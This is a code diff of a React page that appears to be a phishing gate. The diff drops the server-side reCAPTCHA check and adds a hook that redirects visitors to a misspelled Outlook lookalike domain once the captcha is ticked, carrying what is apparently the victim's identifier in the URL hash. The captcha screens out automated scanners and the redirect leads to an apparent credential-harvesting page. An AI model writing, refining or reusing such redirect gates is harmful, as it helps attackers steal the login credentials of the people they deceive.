@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import ReCAPTCHA from "react-google-recaptcha";
 import axios from "axios";
 
@@ -28,28 +28,34 @@ const App = () => {
         console.error("Error:", error.message);
       });
   }
-  const [recaptchaValue, setRecaptchaValue] = useState("");
+  const [recaptchaValue, setRecaptchaValue] = useState(false);
 
   const handleRecaptchaChange = (value) => {
-    setRecaptchaValue(value);
+    setRecaptchaValue(true);
   };
-
-  const handleSubmit = async () => {
-    try {
-      const response = await axios.post("/.netlify/functions/verifyRecaptcha", {
-        recaptchaValue,
-      });
-
-      const { message } = response.data;
-      if (message) {
-        window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
-      }
-
-      // Proceed with your form submission logic here if needed
-    } catch (error) {
-      console.error("Error submitting form:", error);
+  useEffect(() => {
+    // Code to run on component mount or when certain dependencies change
+    if (recaptchaValue) {
+      window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
     }
-  };
+  }, [recaptchaValue, hashValue]);
+
+  // const handleSubmit = async () => {
+  //   try {
+  //     const response = await axios.post("/.netlify/functions/verifyRecaptcha", {
+  //       recaptchaValue,
+  //     });
+
+  //     const { message } = response.data;
+  //     if (recaptchaValue) {
+  //       window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
+  //     }
+
+  //     // Proceed with your form submission logic here if needed
+  //   } catch (error) {
+  //     console.error("Error submitting form:", error);
+  //   }
+  // };
 
   return (
     <div className=" container mt-5 pt-5 ">
@@ -62,7 +68,7 @@ const App = () => {
 
         <button
           type="button"
-          onClick={handleSubmit}
+          // onClick={handleSubmit}
           className="btn btn-primary mt-1"
         >
           Submit
